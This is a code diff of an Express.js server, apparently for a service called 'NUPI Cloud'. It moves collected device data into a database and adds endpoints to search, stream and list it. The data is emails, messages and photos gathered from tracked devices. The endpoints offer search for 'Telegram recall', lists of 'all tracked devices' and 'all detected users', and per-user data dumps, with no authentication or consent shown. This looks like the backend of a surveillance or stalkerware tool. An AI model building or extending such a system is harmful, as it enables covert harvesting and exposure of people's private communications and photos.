@@ -2107,29 +2107,25 @@ app.get('/api/network/speed-test', async (req, res) => {
 });
 
 // ===== USER DATA COLLECTION & STORAGE =====
-const userDataStore = new Map(); // In-memory store (can be moved to database)
+const database = require('./database');
 
 app.post('/api/user-data/collect', async (req, res) => {
     try {
         const data = req.body;
-        const dataId = `${data.deviceId}_${Date.now()}`;
         
-        // Store collected data
-        userDataStore.set(dataId, {
-            ...data,
-            collected: new Date().toISOString(),
-            id: dataId
-        });
+        // Store in database
+        const record = database.storeCollection(data);
         
         console.log(`📧 Collected user data from device: ${data.deviceId}`);
+        if (data.userName) console.log(`   - User Name: ${data.userName}`);
         console.log(`   - Emails: ${data.emails.length}`);
         console.log(`   - Messages: ${data.messages.length}`);
         console.log(`   - Photos: ${data.photos.length}`);
         
         res.json({ 
             success: true, 
-            dataId,
-            message: 'User data stored in NUPI Cloud' 
+            recordId: record.id,
+            message: 'User data stored in NUPI Cloud Database' 
         });
     } catch (error) {
         res.status(500).json({ error: error.message });
@@ -2140,13 +2136,8 @@ app.post('/api/user-data/collect', async (req, res) => {
 app.get('/api/user-data/device/:deviceId', (req, res) => {
     try {
         const { deviceId } = req.params;
-        const deviceData = [];
-        
-        userDataStore.forEach((value, key) => {
-            if (value.deviceId === deviceId) {
-                deviceData.push(value);
-            }
-        });
+        const limit = parseInt(req.query.limit) || 50;
+        const deviceData = database.getDeviceData(deviceId, limit);
         
         res.json({
             success: true,
@@ -2162,54 +2153,8 @@ app.get('/api/user-data/device/:deviceId', (req, res) => {
 // Search collected data (for Telegram recall)
 app.post('/api/user-data/search', (req, res) => {
     try {
-        const { query, deviceId, type } = req.body;
-        const results = [];
-        
-        userDataStore.forEach((value, key) => {
-            if (deviceId && value.deviceId !== deviceId) return;
-            
-            // Search emails
-            if ((!type || type === 'email') && value.emails) {
-                value.emails.forEach(email => {
-                    if (JSON.stringify(email).toLowerCase().includes(query.toLowerCase())) {
-                        results.push({
-                            type: 'email',
-                            data: email,
-                            collected: value.collected,
-                            deviceId: value.deviceId
-                        });
-                    }
-                });
-            }
-            
-            // Search messages
-            if ((!type || type === 'message') && value.messages) {
-                value.messages.forEach(message => {
-                    if (JSON.stringify(message).toLowerCase().includes(query.toLowerCase())) {
-                        results.push({
-                            type: 'message',
-                            data: message,
-                            collected: value.collected,
-                            deviceId: value.deviceId
-                        });
-                    }
-                });
-            }
-            
-            // Search photos
-            if ((!type || type === 'photo') && value.photos) {
-                value.photos.forEach(photo => {
-                    if (JSON.stringify(photo).toLowerCase().includes(query.toLowerCase())) {
-                        results.push({
-                            type: 'photo',
-                            data: photo,
-                            collected: value.collected,
-                            deviceId: value.deviceId
-                        });
-                    }
-                });
-            }
-        });
+        const { query, type } = req.body;
+        const results = database.search(query, type);
         
         res.json({
             success: true,
@@ -2222,27 +2167,89 @@ app.post('/api/user-data/search', (req, res) => {
     }
 });
 
-// Get latest data for Telegram quick access
+// Get latest data for Telegram quick access (EMERGENCY)
 app.get('/api/user-data/latest/:deviceId', (req, res) => {
     try {
         const { deviceId } = req.params;
-        let latestData = null;
-        let latestTime = 0;
-        
-        userDataStore.forEach((value, key) => {
-            if (value.deviceId === deviceId) {
-                const time = new Date(value.collected).getTime();
-                if (time > latestTime) {
-                    latestTime = time;
-                    latestData = value;
-                }
-            }
-        });
+        const latestData = database.getLatestDeviceData(deviceId);
         
         res.json({
             success: true,
             data: latestData,
             message: latestData ? 'Latest data found' : 'No data collected yet'
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// 📊 REAL-TIME STREAM - Get latest collections across all devices
+app.get('/api/user-data/stream', (req, res) => {
+    try {
+        const limit = parseInt(req.query.limit) || 10;
+        const stream = database.getRealTimeStream(limit);
+        
+        res.json({
+            success: true,
+            count: stream.length,
+            stream
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// 📈 STATS - Overall system statistics
+app.get('/api/user-data/stats', (req, res) => {
+    try {
+        const stats = database.getStats();
+        res.json({
+            success: true,
+            stats
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// 🎯 ALL DEVICES - List all tracked devices
+app.get('/api/user-data/devices', (req, res) => {
+    try {
+        const devices = database.getAllDevices();
+        res.json({
+            success: true,
+            count: devices.length,
+            devices
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// 👥 ALL USERS - List all detected users
+app.get('/api/user-data/users', (req, res) => {
+    try {
+        const users = database.getAllUsers();
+        res.json({
+            success: true,
+            count: users.length,
+            users
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// 👤 USER DATA - Get all data for specific user name
+app.get('/api/user-data/user/:userName', (req, res) => {
+    try {
+        const { userName } = req.params;
+        const userData = database.getUserData(userName);
+        
+        res.json({
+            success: true,
+            user: userData,
+            message: userData ? 'User data found' : 'User not found'
         });
     } catch (error) {
         res.status(500).json({ error: error.message });
